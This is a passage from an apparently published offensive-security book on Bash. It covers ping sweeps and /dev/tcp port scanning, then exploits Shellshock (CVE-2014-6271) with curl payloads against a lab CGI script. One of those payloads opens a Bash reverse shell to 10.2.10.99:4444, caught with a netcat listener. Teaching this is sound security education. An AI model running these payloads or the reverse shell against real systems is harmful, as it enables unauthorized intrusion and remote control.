     </span>
    </strong>
    <span class="koboSpan" id="kobo.508.1">
     scan or a full TCP connect scan, that is a strong indication that a host is active, even if it doesn’t respond to pings (some hosts are configured to not respond to ICMP).
    </span>
    <span class="koboSpan" id="kobo.508.2">
     Common ports to check are
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.509.1">
      TCP 80 (HTTP)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.510.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.511.1">
      443 (HTTPS)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.512.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.513.1">
      22 (SSH)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.514.1">
     , and so on depending on what services you expect to find on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.515.1">
      the network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.516.1">
     You might wonder why you should bother writing Bash scripts for network discovery when there are plenty of existing tools such as Nmap.
    </span>
    <span class="koboSpan" id="kobo.516.2">
     While those tools are certainly powerful and have their place, there are a few advantages to creating your own
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.517.1">
      Bash scripts:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.518.1">
       Simplicity
      </span>
     </strong>
     <span class="koboSpan" id="kobo.519.1">
      : Bash scripts can be very simple and concise.
     </span>
     <span class="koboSpan" id="kobo.519.2">
      You can write a basic network discovery script in just a few lines
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.520.1">
       of Bash.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.521.1">
       Portability
      </span>
     </strong>
     <span class="koboSpan" id="kobo.522.1">
      : Bash is available
     </span>
     <a id="_idIndexMarker369">
     </a>
     <span class="koboSpan" id="kobo.523.1">
      on virtually every Linux/Unix system.
     </span>
     <span class="koboSpan" id="kobo.523.2">
      Your Bash scripts can run on any machine with Bash, without needing to install additional tools.
     </span>
     <span class="koboSpan" id="kobo.523.3">
      Eventually, you will face a scenario where you have hacked into a system and need to pivot from it to another network but you can’t install anything on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.524.1">
       the host.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.525.1">
       Learning
      </span>
     </strong>
     <span class="koboSpan" id="kobo.526.1">
      : Writing your own network discovery scripts is a great way to learn Bash scripting and understand the underlying process of
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.527.1">
       network enumeration.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.528.1">
     So, let’s see how we can put Bash to work for discovering
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.529.1">
      active hosts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.530.1">
     Here’s a simple Bash one-liner to ping
    </span>
    <a id="_idIndexMarker370">
    </a>
    <span class="koboSpan" id="kobo.531.1">
     a range of IP addresses and print out the ones
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.532.1">
      that respond:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.533.1">
$ for ip in 10.0.1.{1..254}; do ping -c 1 $ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &amp; done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.534.1">
     Let’s break
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.535.1">
      this down:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.536.1">
       for ip in 10.0.1.{1..254}; do
      </span>
     </strong>
     <span class="koboSpan" id="kobo.537.1">
      : This starts a
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.538.1">
       for
      </span>
     </strong>
     <span class="koboSpan" id="kobo.539.1">
      loop that will iterate over the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.540.1">
       10.0.1.1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.541.1">
      to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.542.1">
       10.0.1.254
      </span>
     </strong>
     <span class="koboSpan" id="kobo.543.1">
      IP addresses.
     </span>
     <span class="koboSpan" id="kobo.543.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.544.1">
       {1..254}
      </span>
     </strong>
     <span class="koboSpan" id="kobo.545.1">
      syntax is Bash brace expansion, a handy way to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.546.1">
       generate sequences.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.547.1">
       ping -c 1 $ip
      </span>
     </strong>
     <span class="koboSpan" id="kobo.548.1">
      : This pings the current IP address in the loop.
     </span>
     <span class="koboSpan" id="kobo.548.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.549.1">
       -c 1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.550.1">
      option specifies sending only one
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.551.1">
       ping packet.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.552.1">
       grep "64 bytes"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.553.1">
      : This filters the ping output, only passing through lines that contain
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.554.1">
       "64 bytes"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.555.1">
      , which indicates a successful
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.556.1">
       ping response.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.557.1">
       cut -d " " -f 4
      </span>
     </strong>
     <span class="koboSpan" id="kobo.558.1">
      : This cuts out the fourth field of the filtered ping output, which is the IP address
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.559.1">
       that responded.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.560.1">
       tr -d ":"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.561.1">
      : This trims off the trailing colon from the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.562.1">
       IP address.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.563.1">
       &amp; done
      </span>
     </strong>
     <span class="koboSpan" id="kobo.564.1">
      : The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.565.1">
       &amp;
      </span>
     </strong>
     <span class="koboSpan" id="kobo.566.1">
      character at the end backgrounds each ping process, allowing the loop to proceed without waiting for each ping to finish.
     </span>
     <span class="koboSpan" id="kobo.566.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.567.1">
       done
      </span>
     </strong>
     <span class="koboSpan" id="kobo.568.1">
      keyword closes the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.569.1">
        for
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.570.1">
       loop.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.571.1">
     Running this one-liner will quickly ping all 254 addresses in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.572.1">
      10.0.1.0/24
     </span>
    </strong>
    <span class="koboSpan" id="kobo.573.1">
     network and print out the ones that respond, giving you a list of active hosts.
    </span>
    <span class="koboSpan" id="kobo.573.2">
     You can easily change the network by modifying the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.574.1">
       10.0.1
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.575.1">
      part.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.576.1">
     Pinging is a good start, but as mentioned earlier, some hosts block pings and firewalls frequently restrict ping ICMP packets.
    </span>
    <span class="koboSpan" id="kobo.576.2">
     A more thorough approach is to also scan some common ports on each IP to see whether anything responds.
    </span>
    <span class="koboSpan" id="kobo.576.3">
     Here’s a Bash script that pings each IP and
    </span>
    <a id="_idIndexMarker371">
    </a>
    <span class="koboSpan" id="kobo.577.1">
     then does a quick TCP connect scan on a few
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.578.1">
      common ports:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.579.1">
#!/usr/bin/env bash
network="10.0.1"
ports=(22 80 443 445 3389)
for host in {1..254}; do
  ip="$network.$host"
  ping -c 1 $ip &gt;/dev/null 2&gt;&amp;1
  if [ $? </span><span class="koboSpan" id="kobo.579.2">-eq 0 ]; then
    echo "$ip is up"
  fi
  for port in "${ports[@]}"; do
    timeout 1 bash -c "echo &gt;/dev/tcp/$ip/$port" &gt;/dev/null 2&gt;&amp;1
    if [ $? </span><span class="koboSpan" id="kobo.579.3">-eq 0 ]; then
      echo "port $port is open on $ip"
    fi
  done
done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.580.1">
     This script does
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.581.1">
      the following:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.582.1">
      It defines the network to scan (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.583.1">
       10.0.1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.584.1">
      ) and the ports to check (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.585.1">
       22
      </span>
     </strong>
     <span class="koboSpan" id="kobo.586.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.587.1">
       80
      </span>
     </strong>
     <span class="koboSpan" id="kobo.588.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.589.1">
       443
      </span>
     </strong>
     <span class="koboSpan" id="kobo.590.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.591.1">
       445
      </span>
     </strong>
     <span class="koboSpan" id="kobo.592.1">
      ,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.593.1">
       and
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.594.1">
        3389
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.595.1">
       ).
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.596.1">
      It starts a loop over all host addresses in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.597.1">
       {
      </span>
     </strong>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.598.1">
        1..254}
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.599.1">
       network.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.600.1">
      It pings each host.
     </span>
     <span class="koboSpan" id="kobo.600.2">
      If the ping is successful (exit status
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.601.1">
       0
      </span>
     </strong>
     <span class="koboSpan" id="kobo.602.1">
      ), it prints that the host
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.603.1">
       is up.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.604.1">
      For each host, it then loops over the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.605.1">
       defined ports.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.606.1">
      For each port, it uses the Bash
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.607.1">
       /dev/tcp
      </span>
     </strong>
     <span class="koboSpan" id="kobo.608.1">
      feature to attempt a TCP connection.
     </span>
     <span class="koboSpan" id="kobo.608.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.609.1">
       timeout 1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.610.1">
      command aborts the connection attempt after one second to avoid hanging on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.611.1">
       unresponsive ports.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.612.1">
      If the TCP connection is successful, it prints that the port is open on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.613.1">
       the host.
      </span>
     </span>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.614.1">
     This script provides
    </span>
    <a id="_idIndexMarker372">
    </a>
    <span class="koboSpan" id="kobo.615.1">
     a more comprehensive view of active hosts on the network by checking both ping responsiveness and open ports.
    </span>
    <span class="koboSpan" id="kobo.615.2">
     You can easily customize the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.616.1">
      ports
     </span>
    </strong>
    <span class="koboSpan" id="kobo.617.1">
     array to include any ports you want
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.618.1">
      to check.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.619.1">
     Bash scripting provides a simple yet powerful way to discover active hosts on a network.
    </span>
    <span class="koboSpan" id="kobo.619.2">
     With just a few lines of Bash, you can ping ranges of IP addresses, scan for open ports, and get a quick map of live hosts.
    </span>
    <span class="koboSpan" id="kobo.619.3">
     These basic techniques can be extended and customized in countless ways to suit your
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.620.1">
      specific needs.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.621.1">
     Of course, for more advanced network discovery and vulnerability scanning, you’ll likely want to use dedicated tools such as Nmap.
    </span>
    <span class="koboSpan" id="kobo.621.2">
     However, for quick checks and simple automation, Bash scripting is a valuable tool to have in your network testing toolkit.
    </span>
    <span class="koboSpan" id="kobo.621.3">
     Plus, writing your own discovery scripts is a great way to sharpen your Bash skills and gain a deeper understanding of the network
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.622.1">
      enumeration process.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.623.1">
     So, the next time you need to discover some hosts on a network, consider using your text editor to make up a Bash script.
    </span>
    <span class="koboSpan" id="kobo.623.2">
     You might be surprised at how much you
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.624.1">
      can accomplish.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.625.1">
     Having learned network enumeration in Bash, in the next section, we’ll progress into
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.626.1">
      network exploitation.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-119">
    <a id="_idTextAnchor159">
    </a>
    <span class="koboSpan" id="kobo.627.1">
     Network exploitation
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.628.1">
     In this section, we’ll dive into exploiting command injection vulnerabilities in web applications that fail to
    </span>
    <a id="_idIndexMarker373">
    </a>
    <span class="koboSpan" id="kobo.629.1">
     filter user input before passing data on to operating
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.630.1">
      system commands.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-120">
    <a id="_idTextAnchor160">
    </a>
    <span class="koboSpan" id="kobo.631.1">
     Network service exploitation
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.632.1">
     In September 2014, a critical
    </span>
    <a id="_idIndexMarker374">
    </a>
    <span class="koboSpan" id="kobo.633.1">
     vulnerability was discovered in the Unix Bash shell.
    </span>
    <span class="koboSpan" id="kobo.633.2">
     This vulnerability, assigned the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.634.1">
      CVE-2014-6271
     </span>
    </strong>
    <span class="koboSpan" id="kobo.635.1">
     identifier and nicknamed
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.636.1">
      Shellshock
     </span>
    </em>
    <span class="koboSpan" id="kobo.637.1">
     , sent shockwaves through the information security community due to its severity and widespread impact.
    </span>
    <span class="koboSpan" id="kobo.637.2">
     Let’s dive into the technical details of this vulnerability and explore how it can
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.638.1">
      be exploited.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.639.1">
     The Shellshock vulnerability stems from a flaw in how Bash processes environment variables.
    </span>
    <span class="koboSpan" id="kobo.639.2">
     Specifically, it allows an attacker to execute arbitrary commands by manipulating environment variables in a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.640.1">
      crafted manner.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.641.1">
     In Bash, environment variables can be defined in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.642.1">
      following format:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.643.1">
VAR=value</span></pre>
   <p>
    <span class="koboSpan" id="kobo.644.1">
     However, Bash
    </span>
    <a id="_idIndexMarker375">
    </a>
    <span class="koboSpan" id="kobo.645.1">
     also supports a feature called
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.646.1">
      function exporting
     </span>
    </strong>
    <span class="koboSpan" id="kobo.647.1">
     , which allows defining shell functions
    </span>
    <a id="_idIndexMarker376">
    </a>
    <span class="koboSpan" id="kobo.648.1">
     and exporting them as environment variables.
    </span>
    <span class="koboSpan" id="kobo.648.2">
     The vulnerability arises from the fact that Bash did not properly parse and sanitize these
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.649.1">
      function definitions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.650.1">
     Here’s an example of a vulnerable
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.651.1">
      function definition:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.652.1">
ENV=() { ignored; }; echo "Malicious code"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.653.1">
     In this case, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.654.1">
      ENV
     </span>
    </strong>
    <span class="koboSpan" id="kobo.655.1">
     variable is defined as a function that executes the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.656.1">
      echo "Malicious code"
     </span>
    </strong>
    <span class="koboSpan" id="kobo.657.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.657.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.658.1">
      ignored
     </span>
    </strong>
    <span class="koboSpan" id="kobo.659.1">
     part is used to bypass any preceding code that Bash may try
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.660.1">
      to execute.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.661.1">
     When an environment variable containing such a crafted function definition is passed to a Bash script or a program that invokes Bash, the malicious code within the function definition gets executed.
    </span>
    <span class="koboSpan" id="kobo.661.2">
     This allows an attacker to inject and execute arbitrary commands on the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.662.1">
      targeted system.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.663.1">
     Now, let’s analyze
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.664.1">
      the payload:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.665.1">
$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.2.10.1:8080/victim.cgi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.666.1">
     This payload exploits the Shellshock vulnerability to execute the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.667.1">
      /usr/bin/id
     </span>
    </strong>
    <span class="koboSpan" id="kobo.668.1">
     command on the target system and retrieve
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.669.1">
      the result.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.670.1">
     Here’s the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.671.1">
      command output:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer058">
     <span class="koboSpan" id="kobo.672.1">
      <img alt="Figure 6.10 – The output of the Shellshock exploit" src="image/B22229_06_10.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.673.1">
     Figure 6.10 – The output of the Shellshock exploit
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.674.1">
     Here’s a breakdown of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.675.1">
      the payload:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.676.1">
       curl
      </span>
     </strong>
     <span class="koboSpan" id="kobo.677.1">
      : This is a
     </span>
     <a id="_idIndexMarker377">
     </a>
     <span class="koboSpan" id="kobo.678.1">
      command-line tool for making
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.679.1">
       HTTP requests.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.680.1">
       -A "() { ignored; };
      </span>
     </strong>
     <span class="koboSpan" id="kobo.681.1">
      : The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.682.1">
       -A
      </span>
     </strong>
     <span class="koboSpan" id="kobo.683.1">
      option sets the user agent string for the HTTP request.
     </span>
     <span class="koboSpan" id="kobo.683.2">
      In this case, it is set to a crafted function definition that exploits the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.684.1">
       Shellshock vulnerability.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.685.1">
       echo Content-Type: text/plain ; echo ; echo ;
      </span>
     </strong>
     <span class="koboSpan" id="kobo.686.1">
      : These
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.687.1">
       echo
      </span>
     </strong>
     <span class="koboSpan" id="kobo.688.1">
      commands are used to construct a valid HTTP response header and body.
     </span>
     <span class="koboSpan" id="kobo.688.2">
      They ensure that the response is treated as plain text and includes necessary
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.689.1">
       line breaks.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.690.1">
       /usr/bin/id
      </span>
     </strong>
     <span class="koboSpan" id="kobo.691.1">
      : This is the actual command that will be executed on the target system.
     </span>
     <span class="koboSpan" id="kobo.691.2">
      In this case, it is the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.692.1">
       id
      </span>
     </strong>
     <span class="koboSpan" id="kobo.693.1">
      command, which retrieves information about the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.694.1">
       current user.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.695.1">
       http://10.2.10.1:8080/victim.cgi
      </span>
     </strong>
     <span class="koboSpan" id="kobo.696.1">
      : The URL of the vulnerable
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.697.1">
       Common Gateway Interface
      </span>
     </strong>
     <span class="koboSpan" id="kobo.698.1">
      (
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.699.1">
       CGI
      </span>
     </strong>
     <span class="koboSpan" id="kobo.700.1">
      ) script on
     </span>
     <a id="_idIndexMarker378">
     </a>
     <span class="koboSpan" id="kobo.701.1">
      the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.702.1">
       target system.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.703.1">
     When this payload is sent to the vulnerable CGI script, the crafted function definition in the user agent string is passed as an environment variable to the script.
    </span>
    <span class="koboSpan" id="kobo.703.2">
     Bash, which is often used to execute CGI scripts, parses the environment variable and executes the injected command (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.704.1">
      /usr/bin/id
     </span>
    </strong>
    <span class="koboSpan" id="kobo.705.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.705.2">
     The output of the command is then included in the HTTP response, allowing the attacker to retrieve
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.706.1">
      the result.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.707.1">
     In the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.708.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.709.1">
     command we previously used to exploit Shellshock, let’s swap out the command with one that will make the vulnerable system connect a reverse shell to our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.710.1">
      IP address.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.711.1">
     Here’s our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.712.1">
      updated exploit:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.713.1">
$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -l &gt; /dev/tcp/10.2.10.99/4444 0&lt;&amp;1 2&gt;&amp;1" http://10.2.10.1:8080/victim.cgi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.714.1">
     This Bash command opens a reverse
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.715.1">
      shell connection:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.716.1">
       /bin/bash -l
      </span>
     </strong>
     <span class="koboSpan" id="kobo.717.1">
      : This starts a new Bash shell session as a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.718.1">
       login shell.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.719.1">
       &gt; /dev/tcp/10.2.10.99/4444
      </span>
     </strong>
     <span class="koboSpan" id="kobo.720.1">
      : This redirects shell’s standard output (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.721.1">
       STDOUT
      </span>
     </strong>
     <span class="koboSpan" id="kobo.722.1">
      ) to a TCP connection to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.723.1">
       10.2.10.99
      </span>
     </strong>
     <span class="koboSpan" id="kobo.724.1">
      IP on port
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.725.1">
       4444
      </span>
     </strong>
     <span class="koboSpan" id="kobo.726.1">
      .
     </span>
     <span class="koboSpan" id="kobo.726.2">
      This starts to make more sense once you learn that everything is a file, or appears in the file system,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.727.1">
       on Linux.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.728.1">
       0&lt;&amp;1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.729.1">
      : This redirects standard input (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.730.1">
       STDIN
      </span>
     </strong>
     <span class="koboSpan" id="kobo.731.1">
      ) to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.732.1">
       STDOUT
      </span>
     </strong>
     <span class="koboSpan" id="kobo.733.1">
      , allowing commands sent from the remote host to be executed by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.734.1">
       the shell.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.735.1">
       2&gt;&amp;1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.736.1">
      : This merges standard error (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.737.1">
       STDERR
      </span>
     </strong>
     <span class="koboSpan" id="kobo.738.1">
      ) with
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.739.1">
       STDOUT
      </span>
     </strong>
     <span class="koboSpan" id="kobo.740.1">
      , so all shell output and error messages are sent to the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.741.1">
       remote host.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.742.1">
     Before we execute the
    </span>
    <a id="_idIndexMarker379">
    </a>
    <span class="koboSpan" id="kobo.743.1">
     exploit, we must be ready to capture the reverse shell connection by running the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.744.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.745.1">
$ nc -nlvp 4444</span></pre>
   <p>
    <span class="koboSpan" id="kobo.746.1">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.747.1">
      the explanation:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.748.1">
       nc
      </span>
     </strong>
     <span class="koboSpan" id="kobo.749.1">
      : This is the
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.750.1">
        Netcat
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.751.1">
       command
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.752.1">
      Here’s a breakdown
     </span>
     <a id="_idIndexMarker380">
     </a>
     <span class="koboSpan" id="kobo.753.1">
      of the parameters
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.754.1">
       -
      </span>
     </strong>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.755.1">
        nlvp 4444
       </span>
      </strong>
     </span>
     <ul>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.756.1">
         n
        </span>
       </strong>
       <span class="koboSpan" id="kobo.757.1">
        : numeric-only IP addresses,
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.758.1">
         no DNS
        </span>
       </span>
      </li>
